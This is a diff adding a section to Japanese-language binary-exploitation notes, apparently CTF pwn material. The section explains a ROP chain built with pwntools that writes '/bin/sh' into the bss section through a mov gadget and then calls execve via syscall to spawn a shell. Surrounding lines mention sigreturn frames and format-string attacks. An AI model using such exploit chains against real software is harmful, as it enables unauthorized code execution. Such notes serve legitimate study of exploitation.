@@ -29,6 +29,33 @@ sigret_frame.rip = syscall_ret
 
 ```
 
+## mov命令とbssセクションを利用したROP
+mov QWORD ptr [rax] , rdx
+rdxにbssセクションにつっこむ値をセット(末尾に\x00にすること)  
+raxにbssセクションをセットすればmvでrdxの値をbssセクションに書き込める
+
+```
+rop = ROP(binf)
+
+    rop.raw(rop.rdx)
+    rop.raw('/bin/sh\x00')  # "\x00"を省略すると失敗する
+    rop.raw(rop.rax)
+    rop.raw(binf.bss())
+    rop.raw(0x000000000048dd71)   #mov QWORD ptr [rax] , rdx
+
+
+  # execve('/bin/sh', 0, 0)
+    rop.raw(rop.rdi)
+    rop.raw(binf.bss())
+    rop.raw(rop.rsi)
+    rop.raw(0)
+    rop.raw(rop.rdx)
+    rop.raw(0)
+    rop.raw(rop.rax)
+    rop.raw(constants.SYS_execve)
+    rop.raw(rop.syscall.address)
+```
+
 ## 書式指定子攻撃
 
 ``` %n$p ``` を使用することで、  
